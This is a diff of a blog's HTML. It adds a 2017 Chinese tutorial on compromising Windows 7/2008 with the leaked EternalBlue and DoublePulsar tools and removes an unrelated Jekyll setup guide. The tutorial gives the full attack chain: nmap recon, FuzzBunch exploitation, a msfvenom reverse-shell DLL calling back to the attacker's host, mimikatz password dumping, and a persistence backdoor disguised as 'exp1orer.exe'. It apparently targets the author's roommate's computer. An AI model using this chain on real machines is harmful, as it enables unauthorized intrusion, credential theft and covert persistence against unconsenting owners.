@@ -73,6 +73,131 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-shadowbroker/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2017/04/22/shadowbroker/index/" class="article-date">
+  <time class="dt-published" datetime="2017-04-22T00:00:00.000Z" itemprop="datePublished">2017-04-22</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/justsay/">justsay</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2017/04/22/shadowbroker/index/">[ShadowBroker]1：NSA工具集EternalBlue + Doublepulsar + meterpreter渗透Windows 7/2008，兼谈Windows Server 2003中文版渗透</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>[v_error]警告： 本文仅供实验性研究，请勿用于非法用途，出啥事我不负责。真的！别算我头上，我胆小害怕。 好吧，如果这免责声明能管用的话……[&#x2F;v_error]</p>
+<p>有个歪果仁写了一系列文章，蛮详细的，如果有兴趣的话可以戳去读一读吧：_<a target="_blank" rel="noopener" href="http://www.pwn3d.org/posts/1721872-from-git-clone-to-pwned-owning-windows-with-doublepulsar-and-eternalblue-part-1">From git clone to Pwned - Owning Windows with DoublePulsar and EternalBlue</a>_ </p>
+<p>目前，某些特定版本的Windows 10也可以了，可以参见这个PR <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/pull/9473">https://github.com/rapid7/metasploit-framework/pull/9473</a></p>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>几个星期之前Shadow Broker把NSA的黑客工具偷出来并公布了，据说这些工具非常强大，一个小毛孩都能拿着这些黑掉大半个瘟斗士……嗯，今天我这小毛孩跟你们说下，确实如此好吧。</p>
+<p>本文我们将会集中讨论在Windows上使用EternalBlue来渗透Windows 7&#x2F;2008，然后使用插件Doublepulsar来注入dll。咱使用的工具是NSA的”metasploit”，名为”FuzzBunch”</p>
+<h3 id="为啥选择EternalBlue"><a href="#为啥选择EternalBlue" class="headerlink" title="为啥选择EternalBlue"></a>为啥选择EternalBlue</h3><p>在NSA泄露的那对工具之中，EternalBlue是唯一一个能够攻击Windows 7和Windows Server 2008、并且不需要任何认证信息的工具；在expliot成功之后，我们使用Doublepulsar将我们制作的恶意dll注入系统进程中，从而拿到shell</p>
+<h3 id="概念解释"><a href="#概念解释" class="headerlink" title="概念解释"></a>概念解释</h3><p><strong>exploit</strong>：就是用来触发漏洞的程序</p>
+<p><strong>payload</strong>：就是触发漏洞之后执行的代码。如果exploit是火药的话，payload就是（具有杀伤力的）弹头</p>
+<p><strong>framework</strong>：为了方便使用、测试、研究，人们把这么一大堆东西放到一起做成一个”框架”，咱可以在这一个框架里完成exploit、payload等操作，不用来回切换，嗯粗略理解就是个这么玩意。</p>
+<h2 id="准备实验环境"><a href="#准备实验环境" class="headerlink" title="准备实验环境"></a>准备实验环境</h2><p>我们需要准备三台电脑，好吧，其实虚拟机就够了（记得设置成桥接）。并且这三台电脑要在同一局域网下，也就意味着能够互相ping通</p>
+<h3 id="目标机、靶机：-Windows-7-x64-SP1：172-26-99-211"><a href="#目标机、靶机：-Windows-7-x64-SP1：172-26-99-211" class="headerlink" title="目标机、靶机： Windows 7 x64 SP1：172.26.99.211"></a>目标机、靶机： Windows 7 x64 SP1：172.26.99.211</h3><p>Windows 7、Windows server 2008在此作为我们的靶机，也就是受害者。我们啥也不需要知道，只要有个IP、能够ping通就好了。</p>
+<p>感谢我室友那英勇就义的电脑啊！</p>
+<h3 id="攻击机1-FuzzBunch（主要）：Windows-XP-SP3-172-26-97-206"><a href="#攻击机1-FuzzBunch（主要）：Windows-XP-SP3-172-26-97-206" class="headerlink" title="攻击机1 FuzzBunch（主要）：Windows XP SP3:172.26.97.206"></a>攻击机1 FuzzBunch（主要）：Windows XP SP3:172.26.97.206</h3><p>我们用XP来运行FuzzBunch。我猜没人想用wine吧？为啥用xp呢？xp比较小，在虚拟机中安装速度比较快，省时间，省硬盘，嗯……</p>
+<h3 id="攻击机2-Metasploit（次要）：Kali-Linux-172-26-96-152"><a href="#攻击机2-Metasploit（次要）：Kali-Linux-172-26-96-152" class="headerlink" title="攻击机2 Metasploit（次要）：Kali Linux :172.26.96.152"></a>攻击机2 Metasploit（次要）：Kali Linux :172.26.96.152</h3><p>任何一个Linux发行版都可以，只要能够运行metasploit即可；如果实在不会用Linux，在Windows下使用metasploit也算可以吧。</p>
+<p><a target="_blank" rel="noopener" href="https://www.rapid7.com/products/metasploit/download/">metasploit地址戳我</a></p>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>正常来说，咱在做坏事之前，必然要先做一些搜集信息的工作，最常用的工具就是nmap啦！</p>
+<p>咱使用nmap 来探测目标的信息，发现445简直就是福利。使用参数-O代表探测操作系统，-A代表all。</p>
+<p><img src="/images/042217_1027_ShadowBroke1.png"></p>
+<p>Target is all set, blow it! :wink: </p>
+<h2 id="配置FuzzBunch"><a href="#配置FuzzBunch" class="headerlink" title="配置FuzzBunch"></a>配置FuzzBunch</h2><p>FuzzBunch需要Python2.6、旧版本的PyWin32</p>
+<p>Python2.6：<a target="_blank" rel="noopener" href="https://www.python.org/download/releases/2.6/">https://www.python.org/download/releases/2.6/</a>（记得加到环境变量里）</p>
+<p>PyWin32 v2.12：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20212/">https://sourceforge.net/projects/pywin32/files/pywin32/Build%20212/</a></p>
+<p>当然还有这套工具了：<a target="_blank" rel="noopener" href="https://github.com/misterch0c/shadowbroker">https://github.com/misterch0c/shadowbroker</a></p>
+<p>咱把这些东西都准备妥当了，然后编辑<code>windows/fb.py</code>，注释72行</p>
+<p>大概就是如图所示：</p>
+<p><img src="/images/042217_1027_ShadowBroke2.png"></p>
+<p>之后再改FuzzBunch.xml，19和24行改成和你XP上一样的正确的路径。<img src="/images/042217_1027_ShadowBroke3.png"></p>
+<p>之后我们切到对应的目录中，然后执行<code>python fb.py</code>，当当当！</p>
+<p><img src="/images/042217_1027_ShadowBroke4.png"></p>
+<p>默认的目标IP，就写我们的Windows 7咯，也就是172.26.99.211，下一个callback IP，就是XP的IP，然后Redirection输入no；</p>
+<p><img src="/images/042217_1027_ShadowBroke5.png"></p>
+<p>下一步，fz让我们给起个名字，由于我已经运行过了，所以就选择create a new project啦</p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/04/042217_1027_ShadowBroke6.png"><img src="/images/042217_1027_ShadowBroke6.png"></a></p>
+<h2 id="使用EternalBlue攻击目标"><a href="#使用EternalBlue攻击目标" class="headerlink" title="使用EternalBlue攻击目标"></a>使用EternalBlue攻击目标</h2><p>第一步，咱要用EternalBlue来exploit目标，使用方法类似metasploit</p>
+<p>use EternalBlue</p>
+<p><img src="/images/042217_1027_ShadowBroke7.png"></p>
+<p>啥都不管一直按回车使用默认值，除了在mode的时候选择2：FB</p>
+<p><img src="/images/042217_1027_ShadowBroke8.png"></p>
+<p>最后EternalBlue会问我们是否执行？直接回车吧。</p>
+<p>如果不出意外的话，就应该成功了嗯……</p>
+<p><img src="/images/042217_1027_ShadowBroke9.png"></p>
+<p>当然要是出意外了，可能就会提示fail，咱要么<code>execute</code>再运行一下，要么就是目标机蓝屏啥了……嗯反正多试试吧。</p>
+<h2 id="制作恶意dll"><a href="#制作恶意dll" class="headerlink" title="制作恶意dll"></a>制作恶意dll</h2><p>NSA的这堆exploit是很强大，但是payload感觉好像就弱了一些，像Doublepulsar能够注入dll、shellcode，好像没有metasploit那么强大哎？</p>
+<p>没关系，咱用metasploit生成一个dll，交给Doublepulsar注入就好了。</p>
+<p>在生成dll之前，咱首先要学习下metasploit中的meterpreter的几种类型：</p>
+<p>meterpreter就是一个跨平台的shell，功能很强大，嘿嘿嘿。通常来说meterpreter有这么两种模式：正向和反向</p>
+<p><strong>bind</strong>：攻击者连接目标机器的模式，通常比较适合内网渗透，有时会被防火墙拦下</p>
+<p><strong>reverse</strong>：目标机连接攻击者的模式，基本上不会被防火墙阻拦。估计岁数大的小盆友们可能知道灰鸽子？这玩意就是反弹到攻击者的啦。</p>
+<p>当然，这俩还能够细分为tcp、http、https，区别是啥，自己看帮助去！</p>
+<p>这里咱就创建一个reverse_tcp啦。</p>
+<p>需要注意的是，Doublepulsar要求比较多，64位的系统必须用64位的dll，32位的当然只能用32位的了，所以别搞错了。</p>
+<p>咱直接打开终端，输入如下命令：</p>
+<p>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.26.96.152 LPORT&#x3D;8089 -f dll &gt;reverse.dll</p>
+<p>其中LHOST代表kali的IP地址，LPORT代表本地监听的地址（因为要反弹嘛），生成的文件名字为reverse.dll</p>
+<p>我们只要简单的把这个dll拷贝到xp中即可。哎，咋拷贝最方便呢？没装虚拟机的辅助工具？没关系，在dll的存放目录下来一句<code>python –m SimpleHTTPServer 80</code></p>
+<p>拿起XP里久违的IE6，访问kali的IP然后下载那个dll就好了嘛。</p>
+<p>然后咱就让metasploit开启监听吧！</p>
+<p>set PAYLOAD windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>use exploit&#x2F;multi&#x2F;handler<br>set lhost 172.26.96.152<br>set LPORT 8089<br>run</p>
+<p><img src="/images/042217_1027_ShadowBroke10.png"></p>
+<p>附录： 生成bind模式的meterpreter</p>
+<p>#32位<br>msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp RHOST&#x3D;10.1.1.71 LPORT&#x3D;8089 -f dll &gt;x86bind.dll<br>#64位<br>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp RHOST&#x3D;10.1.1.71 LPORT&#x3D;8089 -f dll &gt;x64bind.dll</p>
+<p>RHOST为目标机的IP、LPORT为目标机开的端口号</p>
+<h2 id="使用Doublepulsar注入我们的恶意dll"><a href="#使用Doublepulsar注入我们的恶意dll" class="headerlink" title="使用Doublepulsar注入我们的恶意dll"></a>使用Doublepulsar注入我们的恶意dll</h2><p>use DoublePulsa</p>
+<p>老样子，一路回车，除了Architecture选择x64，Function选RunDLL，然后输入DLL路径。</p>
+<p><img src="/images/042217_1027_ShadowBroke11.png"></p>
+<p>如果运气好的话，嘿嘿嘿……</p>
+<p><img src="/images/042217_1027_ShadowBroke12.png"></p>
+<h2 id="之后该做什么呢"><a href="#之后该做什么呢" class="headerlink" title="之后该做什么呢"></a>之后该做什么呢</h2><h3 id="获取管理员密码"><a href="#获取管理员密码" class="headerlink" title="获取管理员密码"></a>获取管理员密码</h3><p>当然第一步是吧管理员密码搞出来了，怎么办呢？很简单啦其实</p>
+<p>load mimikatz<br>wdigest</p>
+<p><img src="/images/042217_1027_ShadowBroke13.png"></p>
+<p>哎这兄弟有我这样的室友真是悲剧啊……</p>
+<h3 id="植入持久后门"><a href="#植入持久后门" class="headerlink" title="植入持久后门"></a>植入持久后门</h3><p>万一目标重启了，咱就要重新exploit、植入dll（因为这玩意是跑在内存里的），多不方便，所以不如咱植入个持久后门嘛，当然，咱要先交叉编译一个后门……</p>
+<p>嗯其实就是，自己看着来，大概就是：</p>
+<p>msfpc windows 172.26.99.211 443 bind verbose</p>
+<p><img src="/images/042217_1027_ShadowBroke14.png"></p>
+<p>之后meterpreter里来这么一句</p>
+<p>run post&#x2F;windows&#x2F;manage&#x2F;persistence_exe REXENAME&#x3D;cmd.exe REXEPATH&#x3D;&#x2F;root&#x2F;backdoor&#x2F;miao.exe STARTUP&#x3D;USER</p>
+<p>其中REXENAME是拷贝到目标系统中的名字，咱取个比较有迷惑性的，比如说exp1orer.exe啦（注意是1不是l），cmd.exe啦，httpd.exe啦等等吧；REXEPATH是后门在本地的位置，STARTUP有USER、SYSTEM、SERVICE这三种取值。看参数就知道是啥意思了。</p>
+<h2 id="最后的话"><a href="#最后的话" class="headerlink" title="最后的话"></a>最后的话</h2><p>反正我们是啥都没要，一个IP就成功的黑了进去。颇有当年ms08-067的风范。</p>
+<p>可怕的地方就是，看文件的时间戳，NSA在2011年就有了EternalBlue……你再看这文件名Eternal永远的永恒的……</p>
+<p>等等……标题里还说了要黑Windows Server 2003不是？可是metasploit里的那个不支持中文版的Windows Server 2003啊……所以，要么咱用修改版的ms08-067，要么用NSA的那个。</p>
+<p>修改版的ms-08-067戳我，<a target="_blank" rel="noopener" href="http://bbs.pediy.com/thread-186737.htm">来源戳我</a>，地址与使用方法戳章鱼猫 [gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/ms08-067/_Server/_2003/_Chinese/_Version'/]%E5%BC%80%E6%BA%90%E8%90%8C%E8%90%8C%E5%93%92%E7%AB%A0%E9%B1%BC%E7%8C%AB/[/gt/]">https://github.com/BennyThink/ms08-067\_Server\_2003\_Chinese\_Version&#39;\]开源萌萌哒章鱼猫\[/gt\]</a></p>
+<h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>exploit db论文： <a target="_blank" rel="noopener" href="https://www.exploit-db.com/docs/41896.pdf">How to Exploit ETERNALBLUE and DOUBLEPULSAR on Windows 7&#x2F;2008</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/04/22/shadowbroker/index/" data-id="clhp7rtjt008is2qr2l3ycqyu" data-title="[ShadowBroker]1：NSA工具集EternalBlue + Doublepulsar + meterpreter渗透Windows 7/2008，兼谈Windows Server 2003中文版渗透" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-quic/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2017/04/06/quic/index/" class="article-date">
@@ -901,81 +1026,6 @@
 
 
   
-    <article id="post-jekyll-nginx/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2017/02/19/jekyll-nginx/index/" class="article-date">
-  <time class="dt-published" datetime="2017-02-19T00:00:00.000Z" itemprop="datePublished">2017-02-19</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/linux/">linux</a>►<a class="article-category-link" href="/categories/linux/website/">website</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2017/02/19/jekyll-nginx/index/">Jekyll + Nginx 配置指南</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>今天突然心血来潮搞上了Jekyll，好吧，就是吃饱了撑的，只是花了一个多小时而已……使我异常惊奇的是，我这一搜啊，全都是怎么在GitHub Pages上玩Jekyll的，也没有找到在VPS上玩Jekyll的啊。真是哦！好吧，那咱就参考官方的文档，自己研究嘛！</p>
-<p>不过先解释下吧，为啥咱要在VPS上玩Jekyll啊？Pages不也很好吗？ 写博客和写代码是两种完全不同的创作，写代码往往需要耗费更多的精力与脑筋，而博客则不会这样… 重中之重是，自定义域名的情况下GitHub Pages<strong>不支持HTTPS</strong>（感谢评论区horo的指正<strong>）</strong>，Flexible SSL无异于掩耳盗铃。对于我来说，HTTPS是必须要有的，无论机密信息是否存在，我必须要对我的访客负责。而且我家这破网经常给我Reset！擦你丫的GFW啊。?? 其实我在<a target="_blank" rel="noopener" href="https://dmesg.app/reason-of-this-blog.html">《为什么我要写独立域名的博客》</a>中已经解释了大部分原因。这里也不多说啦。 [v_tips]关于“全站HTTPS”，我认为这是势在必行的，<a target="_blank" rel="noopener" href="https://fiveyellowmice.com/posts/2015/10/fight-a-peoples-war-for-https.html">《为 HTTPS 打一场人民战争》</a>[&#x2F;v_tips] 首先咱得先把Nginx啊，vhost啥的啊，都搞好，这个我就不说了，包管理器安装就可以，编译安装也可以，当然，我的小地方是支持HTTPS的，所以还需要配置SSL证书啊什么的。文末我会附上相关博文的。</p>
-<p>假定读者已经配置好了Nginx，那咱就开始玩玩《化身博士》吧！以Ubuntu 16.04为例，使用Jekyll 3.X</p>
-<h2 id="解决依赖问题"><a href="#解决依赖问题" class="headerlink" title="解决依赖问题"></a>解决依赖问题</h2><p>Jekyll需要这些环境：</p>
-<blockquote>
-<p>Ruby（including development headers, Jekyll 2 需要 v1.9.3 及以上版本，Jekyll 3 需要 v2 及以上版本） RubyGems Linux, Unix, or Mac OS X NodeJS, 或其他 JavaScript 运行环境（Jekyll 2 或更早版本需要 CoffeeScript 支持）。 Python 2.7（Jekyll 2 或更早版本）</p>
-</blockquote>
-<p>咱就挨个击破咯！</p>
-<p>sudo apt update<br>sudo apt install ruby-full<br>curl -sL <a target="_blank" rel="noopener" href="https://deb.nodesource.com/setup/_6.x">https://deb.nodesource.com/setup\_6.x</a> | sudo -E bash -<br>sudo apt install nodejs<br>gem install jekyll bundle</p>
-<p>好吧，这么简单的几步，Jekyll就好了。</p>
-<h2 id="创建Jekyll博客"><a href="#创建Jekyll博客" class="headerlink" title="创建Jekyll博客"></a>创建Jekyll博客</h2><p>之后咱们需要创建一个目录，用来存放Jekyll博客的目录，之后我们会让Jekyll build静态文件到webroot 简单起见，我们假设Jekyll博客存放在<code>/root/myblog</code>，webroot在<code>/home/wwwroot/example.com</code></p>
-<p>cd &#x2F;root<br>jekyll new myblog</p>
-<p>这样jekyll就会为你创建一个名为myblog的目录，这个目录里就有那些常规该有的<code>_site</code>啊，<code>_posts</code>啊等目录和文件了。怎么修改配置、增加插件、更换主题不在本文的讨论范围之内。 当然啦，咱也可以到GitHub上搜索一个用Pages的倒霉家伙，直接clone过来。 创建成功了之后，我们先build下试试，build是让jekyll根据设置生成静态的html等文件。</p>
-<h2 id="build到webroot"><a href="#build到webroot" class="headerlink" title="build到webroot"></a>build到webroot</h2><p>cd myblog<br>jekyll build</p>
-<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/02/20170219100304100.png"><img src="/images/20170219100304100.png"></a></p>
-<p>通常来说这一步会顺利通过的，假如出现了报错，八成是少了这那的依赖，<code>gem install</code>吧。</p>
-<p>但是咱得把<code>_site</code>中的内容弄到webroot啊。来个cp或者mv？不是不行，就是太low</p>
-<p>jekyll build –source &#x2F;root&#x2F;myblog –destination &#x2F;home&#x2F;wwwroot&#x2F;example.com –incremental</p>
-<p>参数<code>incremental</code>表示增量生成，这样万一哪一天有了百八篇，incremental会很省时间的。 然后大家就把写好的文章上传到_posts，来这么一句就行。 但是有没有一种感觉，还是太繁琐啊？不如试试下面这一句吧！</p>
-<p>jekyll build –source &#x2F;root&#x2F;myblog –destination &#x2F;home&#x2F;wwwroot&#x2F;example.com –incremental –watch&amp;</p>
-<p>这样就把Jekyll丢后台并监视_posts的变化了，如果<code>_posts</code>中的内容改变，Jekyll就会自动build啦。甚至可以把这行加到<code>rc.local</code>中，这样重启也不怕了。 还等什么，按照</p>
-<p>年-月-日-标题.MARKUP</p>
-<p>比如说，</p>
-<p>2011-02-01-new-years-eve-is-awesome.md</p>
-<p>的形式上传文章到<code>_posts</code>里即可。</p>
-<p>当然，Jekyll也有很多自动化部署方式，除了上传文件这种，还有<code>Git post-update</code>钩子，<code>rsync</code>啥的，这里就不说了。</p>
-<hr>
-<p>当然啦，假如你要是想把某人的Pages克隆下来搞个马甲站（这样是非常不地道的行为，有节操的话还请把robots.txt设置成<code>disallow: /</code>)，咱可以写个极其简单的脚本这么玩</p>
-<p>再当然了，你能相信GitHub的服务吗？当然不能，万一哪天运维喝多了删库了遇上GitLab那样的事，波及到自己，就悲剧啦。备份不做，十恶不赦！</p>
-<p>#!&#x2F;bin&#x2F;bash<br>GIT_DIR&#x3D;&#x2F;root&#x2F;myblog&#x2F;.git git pull origin master<br>jekyll build –source &#x2F;root&#x2F;myblog –destination &#x2F;home&#x2F;wwwroot&#x2F;example.com –incremental</p>
-<p>然后加入crontab即可。</p>
-<hr>
-<p>附：<a target="_blank" rel="noopener" href="https://dmesg.app/letsencrypt-nginx-subdomain.html">《Let’s Encrypt + Nginx&#x2F;Apache 配置指南》</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2017/02/19/jekyll-nginx/index/" data-id="clhp7rtgx0048s2qrdrp27jyi" data-title="Jekyll + Nginx 配置指南" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -1020,7 +1070,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/08/">August 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li 